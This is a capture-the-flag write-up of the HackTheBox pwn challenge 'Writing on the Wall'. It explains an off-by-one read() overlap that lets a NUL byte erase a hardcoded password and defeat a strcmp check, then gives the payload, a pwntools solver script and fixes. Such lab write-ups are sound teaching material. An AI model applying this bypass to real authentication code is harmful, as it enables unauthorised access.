---
title: "Writing on the Wall"
date: 2026-12-28 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, off-by-one, buffer-overlap, strcmp, auth-bypass]
description: "A Very Easy Pwn challenge with every mitigation enabled (PIE, Full RELRO, NX, stack canary, CET). No corruption is needed: a fixed-length read is one byte longer than the gap to a hardcoded password, so a NUL byte zeroes the secret and collapses the strcmp check to an empty-string comparison."
---

## Overview

Writing on the Wall is a Very Easy [Pwn](https://app.hackthebox.com/challenges) challenge. The binary ships with **every mitigation turned on** — PIE, Full RELRO, NX, a stack canary, and CET (shadow stack + indirect-branch tracking) — which is the tell that the intended bug is a *logic* flaw, not memory corruption. A fixed-length `read()` overlaps a hardcoded password by a single byte, and a [one-byte out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) lets us collapse the `strcmp` authentication check to a comparison of two empty strings.

## The technique

`checksec` on the binary:

```
RELRO:  Full RELRO
Stack:  Canary found
NX:     NX enabled
PIE:    PIE enabled
SHSTK:  Enabled
IBT:    Enabled
```

`main()` reads a short input, compares it to a hardcoded password with `strcmp`, and on a match calls a win function (`open_door`) that opens `./flag.txt` and prints it. A `banner()` routine paints a decorative "wall" using ANSI escape codes.

Disassembling `main` shows the bug:

```nasm
movabs rax, 0x2073736170743377   ; password "w3tpass " stored at [rbp-0x10]
mov    [rbp-0x10], rax
lea    rax, [rbp-0x16]           ; input buffer at rbp-0x16
mov    edx, 7
call   read                      ; read(0, [rbp-0x16], 7)  <- 7 bytes
lea    rdx, [rbp-0x10]           ; strcmp(input, password)
lea    rax, [rbp-0x16]
call   strcmp
test   eax, eax
jne    fail
call   open_door                 ; match -> print flag
```

The input buffer sits at `rbp-0x16` and the password at `rbp-0x10` — only `0x16 - 0x10 = 6` bytes apart. But `read` accepts **7** bytes, so the 7th byte you send lands on `password[0]`. The two buffers overlap by one byte — a classic [off-by-one](https://cwe.mitre.org/data/definitions/193.html).

```
        rbp-0x16                 rbp-0x10
        |  input (read 7) ->     | password "w3tpass " |
        [ b0 b1 b2 b3 b4 b5 b6 ][ w  3  t  p  a  s  s  ' ' ]
                            ^^^^ b6 overwrites 'w'
```

A C string ends at its first NUL byte, so we can make *both* compared strings empty:

- send `0x00` as the **first** byte -> your input is `""`;
- send `0x00` as the **seventh** byte -> it overwrites `password[0]` -> the password is `""`;
- `strcmp("", "") == 0` -> match -> the flag is printed.

We never need to know the password. The "writing on the wall" is a red herring: `banner()` prints `w3tpass` with ANSI cursor-positioning escapes so it *looks* scrambled, baiting you into typing it. Sending `"w3tpass"` actually fails — its 7th byte `'s'` clobbers `password[0]`, leaving `"s3tpass "` vs `"w3tpass…"`, which diverges.

## Solution

The payload is just `b"\x00" + b"A"*5 + b"\x00"` (7 bytes). The full solver:

```python
#!/usr/bin/env python3
import re, sys
from pwn import remote, context
context.log_level = "info"
HOST, PORT = sys.argv[1], int(sys.argv[2])

# 7-byte payload: first byte NUL (input -> "") and last byte NUL
# (overwrites password[0] -> password -> ""), so strcmp("","") == 0.
payload = b"\x00" + b"A" * 5 + b"\x00"

io = remote(HOST, PORT)
io.send(payload)
data = io.recvall(timeout=5)
io.close()

# strip the ANSI "wall" escape codes, then grab the flag
clean = re.sub(rb"\x1b\[[0-9;]*[A-Za-z]", b"", data)
m = re.search(rb"HTB\{[^}]+\}", clean)
print(clean.decode(errors="replace"))
print("\nFLAG:", m.group().decode() if m else "(not found)")
```

Run it against the spawned instance:

```bash
python3 solve.py <docker_ip> <port>
# ...
# You managed to open the door! Here is the password for the next one: HTB{...}
```

## Why it worked

A fixed-length `read()` that is one byte longer than the gap between two adjacent stack fields is an [off-by-one out-of-bounds write](https://cwe.mitre.org/data/definitions/193.html). Because string comparison stops at the first NUL byte, zeroing the first byte of the compared secret turns the check into `"" == ""` — equality without ever knowing the value. None of the binary's mitigations (canary, PIE, NX, CET) matter, because nothing is corrupted: control flow stays on its intended path, the comparison simply returns the wrong answer.

## Fix / defense

- Size the read to the buffer, not to the gap: `read(fd, buf, sizeof(buf) - 1)` and explicitly NUL-terminate; never let a length exceed the distance to the next field.
- Don't place a secret in a stack/BSS slot adjacent to an attacker-controlled buffer.
- Compare secrets with a constant-time, length-checked comparison instead of `strcmp`, and reject empty/short input before comparing.
- Build with `-fstack-protector-strong` and `-D_FORTIFY_SOURCE=2`, and fuzz with AddressSanitizer, which flags the one-byte overrun immediately.
